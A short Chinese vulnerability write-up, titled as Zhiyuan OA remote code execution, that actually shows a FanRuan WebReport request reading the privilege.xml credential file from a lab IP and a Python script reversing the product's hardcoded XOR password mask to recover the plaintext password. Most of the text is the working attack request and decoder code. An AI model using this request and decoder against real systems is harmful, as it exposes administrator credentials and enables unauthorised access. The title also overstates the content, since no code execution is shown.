# 致远OA远程代码执行

访问地址

```
http://192.168.16.117:8075/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
```

查看到一个账号和密码，但是这个密码被加密过

在帆软系统中使用硬编码的方式存储照着解密算法，我们使用Python写一份解密脚本

![image-20210410143550365](images/%E8%87%B4%E8%BF%9COA%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.assets/image-20210410143550365.png)

```python
def decode(cipher):
    passwd_mask_array = [19, 78, 10, 15, 100, 213, 43, 23]
    passwd = ""
    cipher = cipher[3:]
    for i in range(int(len(cipher) / 4)):
        c1 = int("0x" + cipher[i * 4:(i+1)*4],16)
        c2 = c1 ^ passwd_mask_array[i % 8]
        passwd+=chr(c2)
    return passwd

if __name__ == '__main__':
    cipher = '___0022007c0039003b005100e3'
    print(decode(cipher))
    # 最后算到密码为：123456
```